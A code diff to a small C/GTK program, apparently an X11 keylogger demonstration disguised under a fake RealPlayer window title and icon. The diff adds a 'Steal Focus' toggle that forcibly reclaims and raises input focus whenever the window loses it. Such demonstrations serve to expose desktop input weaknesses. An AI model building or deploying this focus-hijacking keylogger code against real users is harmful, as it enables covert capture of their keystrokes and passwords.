@@ -27,9 +27,42 @@
 
 typedef struct {
   Display *xdisplay;
+  GtkWidget *window;
+
   Keylogger *keylogger;
   GtkTextBuffer *buf;
 } Application;
+
+static void
+on_focus_out (GtkWidget     *widget,
+              GdkEventFocus *event,
+              gpointer       data)
+{
+  Application *app = data;
+  GdkWindow *window = gtk_widget_get_window (widget);
+  Window xwindow = GDK_WINDOW_XID (window);
+
+  XSetInputFocus (app->xdisplay, xwindow, RevertToParent, CurrentTime);
+  XRaiseWindow (app->xdisplay, xwindow);
+}
+
+static void
+steal_focus_toggled (GtkToggleButton *toggle,
+                     gpointer         data)
+{
+  Application *app = data;
+
+  if (gtk_toggle_button_get_active (toggle))
+    {
+      g_signal_connect (app->window, "focus-out-event",
+                        G_CALLBACK (on_focus_out), app);
+    }
+  else
+    {
+      g_signal_handlers_disconnect_by_func (app->window,
+                                            G_CALLBACK (on_focus_out), app);
+    }
+}
 
 static char
 sym_to_char (KeySym sym)
@@ -95,23 +128,27 @@ record_toggled (GtkToggleButton *toggle,
 static void
 app_init (Application *app)
 {
-  GtkWidget *window, *vbox, *record, *scroll, *textview;
+  GtkWidget *vbox, *steal_focus, *record, *scroll, *textview;
 
   GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file ("real.png", NULL);
   gtk_window_set_default_icon (pixbuf);
   g_object_unref (pixbuf);
 
-  window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
-  gtk_widget_set_size_request (window, 700, 500);
-  gtk_window_set_title (GTK_WINDOW (window), "RealPlayer 10.4 Special Deluxe Freemium Edition (Unregistered Trial)");
-  gtk_container_set_border_width (GTK_CONTAINER (window), 6);
+  app->window = gtk_window_new (GTK_WINDOW_TOPLEVEL);
+  gtk_widget_set_size_request (app->window, 700, 500);
+  gtk_window_set_title (GTK_WINDOW (app->window), "RealPlayer 10.4 Special Deluxe Freemium Edition (Unregistered Trial)");
+  gtk_container_set_border_width (GTK_CONTAINER (app->window), 6);
 
   vbox = gtk_box_new (GTK_ORIENTATION_VERTICAL, 6);
-  gtk_container_add (GTK_CONTAINER (window), vbox);
+  gtk_container_add (GTK_CONTAINER (app->window), vbox);
+
+  steal_focus = gtk_toggle_button_new_with_label ("Steal Focus");
+  gtk_container_add (GTK_CONTAINER (vbox), steal_focus);
+  g_signal_connect (steal_focus, "toggled",
+                    G_CALLBACK (steal_focus_toggled), app);
 
   record = gtk_toggle_button_new_with_label ("Record");
   gtk_container_add (GTK_CONTAINER (vbox), record);
-
   g_signal_connect (record, "toggled",
                     G_CALLBACK (record_toggled), app);
 
@@ -132,12 +169,12 @@ app_init (Application *app)
                               NULL);
   gtk_text_view_set_buffer (GTK_TEXT_VIEW (textview), app->buf);
 
-  GdkDisplay *display = gtk_widget_get_display (window);
+  GdkDisplay *display = gtk_widget_get_display (app->window);
   app->xdisplay = GDK_DISPLAY_XDISPLAY (display);
 
   app->keylogger = keylogger_new (app->xdisplay, app_key_event, app);
 
-  gtk_widget_show_all (window);
+  gtk_widget_show_all (app->window);
 }
 
 int main(int argc, char *argv[])
